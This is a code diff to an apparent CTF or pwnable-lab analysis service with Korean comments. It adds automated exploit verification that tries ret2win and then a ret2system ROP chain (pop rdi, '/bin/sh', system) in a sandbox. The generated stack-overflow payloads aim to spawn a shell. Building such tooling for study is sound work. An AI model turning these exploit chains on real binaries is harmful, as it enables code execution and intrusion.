@@ -22,8 +22,10 @@ from pwnable_lab.analyzer.gadgets import (
 from pwnable_lab.analyzer.got_plt import analyze_got_plt
 from pwnable_lab.analyzer.strategy import (
     analyze_strategy,
+    binary_exec_range,
     find_ret_gadget,
     inject_confirmed_offset,
+    ret2system_plan,
     ret2win_target,
 )
 from pwnable_lab.analyzer.strings import extract_strings
@@ -316,34 +318,64 @@ class AnalysisService:
             strategy = inject_confirmed_offset(
                 strategy, offset, method=confirmation.get("method")
             )
-            verification = self._auto_verify_ret2win(data, offset)
+            verification = self._auto_verify(data, offset)
         return {
             "strategy": strategy,
             "confirmation": confirmation,
             "verification": verification,
         }
 
-    def _auto_verify_ret2win(self, data: bytes, offset: int) -> dict:
-        """확정 오프셋 + 정적 win 주소로 ret2win payload 를 자동 검증한다.
+    def _auto_verify(self, data: bytes, offset: int) -> dict:
+        """확정 오프셋으로 익스 기법을 순서대로 자동 시도한다(ret2win → ret2system).
 
-        win 함수가 없으면 시도하지 않는다. 정렬(movaps)이나 ROP 가 필요한
-        바이너리는 직접 검증이 실패할 수 있으며, 그 경우 명시적
-        ``verify-exploit`` 엔드포인트로 체인을 구성해 확인한다.
+        각 시도는 격리 샌드박스에서 실제 payload 를 실행한다. 성공한 첫 기법을
+        반환하고, 모두 실패하면 첫 시도를 대표로 두되 ``attempts`` 에 전 시도를
+        요약한다. 시도할 기법이 하나도 없으면 ``attempted=false``.
         """
 
         image = parse_elf(data)
-        target = ret2win_target(image)
-        if target is None:
-            return {"attempted": False, "reason": "no-ret2win-target"}
-        name, addr = target
         bits = image.bits or 64
+        attempts: list[dict] = []
 
-        # 1) 직접 ret2win: A*offset + p(win).
+        win = ret2win_target(image)
+        if win is not None:
+            attempts.append(self._try_ret2win(data, offset, image, win, bits))
+            if attempts[-1]["succeeded"]:
+                return self._with_attempts(attempts[-1], attempts)
+
+        plan = ret2system_plan(image)
+        if plan is not None:
+            attempts.append(self._try_ret2system(data, offset, image, plan, bits))
+            if attempts[-1]["succeeded"]:
+                return self._with_attempts(attempts[-1], attempts)
+
+        if attempts:
+            return self._with_attempts(attempts[0], attempts)
+        return {"attempted": False, "reason": "no-technique"}
+
+    @staticmethod
+    def _with_attempts(chosen: dict, attempts: list[dict]) -> dict:
+        out = dict(chosen)
+        if len(attempts) > 1:
+            out["attempts"] = [
+                {k: a.get(k) for k in ("technique", "succeeded", "reason")}
+                for a in attempts
+            ]
+        return out
+
+    def _try_ret2win(
+        self,
+        data: bytes,
+        offset: int,
+        image,
+        win: tuple[str, int],
+        bits: int,
+    ) -> dict:
+        """직접 ret2win, 실패 시 amd64 정렬용 ret 가젯으로 한 번 재시도."""
+
+        name, addr = win
         result = self.verify_exploit(data, offset=offset, target=addr, bits=bits)
         alignment = False
-
-        # 2) 실패하고 ret 가젯이 있으면 정렬(movaps)용 ret 를 한 슬롯 끼워 재시도:
-        #    A*offset + p(ret) + p(win).
         if not result.get("succeeded") and bits == 64:
             ret = find_ret_gadget(image)
             if ret is not None:
@@ -352,7 +384,6 @@ class AnalysisService:
                 )
                 if retry.get("succeeded"):
                     result, alignment = retry, True
-
         return {
             "attempted": True,
             "technique": "ret2win",
@@ -362,6 +393,66 @@ class AnalysisService:
             "alignment_ret_gadget": alignment,
             "succeeded": result.get("succeeded", False),
             "reason": result.get("reason"),
+            "result": result,
+        }
+
+    def _try_ret2system(
+        self, data: bytes, offset: int, image, plan: dict, bits: int
+    ) -> dict:
+        """pop rdi → /bin/sh → system 체인이 실제로 system() 으로 제어를 넘기는지 확인.
+
+        비대화형 샌드박스에서는 spawn 된 셸에 명령을 흘려 넣기 어렵고(대상 stdio
+        버퍼링), system() 리턴 뒤 복귀주소가 없어 크래시하므로 stdout 마커로
+        "셸 획득"을 증명하기 어렵다. 대신 **제어가 바이너리 밖(libc 의 system)으로
+        이전**됐는지(크래시 RIP 가 바이너리 실행범위 밖)를 성공 신호로 쓴다.
+        정렬(movaps) 때문에 첫 시도가 바이너리 안에서 죽으면 ret 가젯을 끼워 재시도.
+        """
+
+        pop_rdi, binsh, system = plan["pop_rdi"], plan["binsh"], plan["system"]
+        rng = binary_exec_range(image)
+
+        def reached_system(result: dict) -> bool:
+            rip = result.get("observation", {}).get("rip")
+            return rip is not None and rng is not None and not (rng[0] <= rip < rng[1])
+
+        chains = [[binsh, system]]
+        ret = find_ret_gadget(image)
+        if ret is not None:
+            chains.append([binsh, ret, system])  # movaps 정렬 변형
+
+        best: dict = {}
+        alignment = False
+        for i, chain in enumerate(chains):
+            result = self.verify_exploit(
+                data, offset=offset, target=pop_rdi, chain=chain, bits=bits
+            )
+            best = result
+            if reached_system(result):
+                alignment = i > 0
+                return self._ret2system_report(
+                    plan, alignment, True, "control-into-system", result
+                )
+        return self._ret2system_report(
+            plan, alignment, False, "did-not-reach-system", best
+        )
+
+    @staticmethod
+    def _ret2system_report(
+        plan: dict, alignment: bool, succeeded: bool, reason: str, result: dict
+    ) -> dict:
+        return {
+            "attempted": True,
+            "technique": "ret2system",
+            "pop_rdi_hex": f"0x{plan['pop_rdi']:x}",
+            "binsh_hex": f"0x{plan['binsh']:x}",
+            "system_hex": f"0x{plan['system']:x}",
+            "alignment_ret_gadget": alignment,
+            "succeeded": succeeded,
+            "reason": reason,
+            "note": (
+                "제어가 system() 으로 이전됨(rdi=/bin/sh). 완전한 셸 상호작용은 "
+                "대화형 세션이 필요하며 비대화형 샌드박스에서는 증명하지 않는다."
+            ),
             "result": result,
         }
 
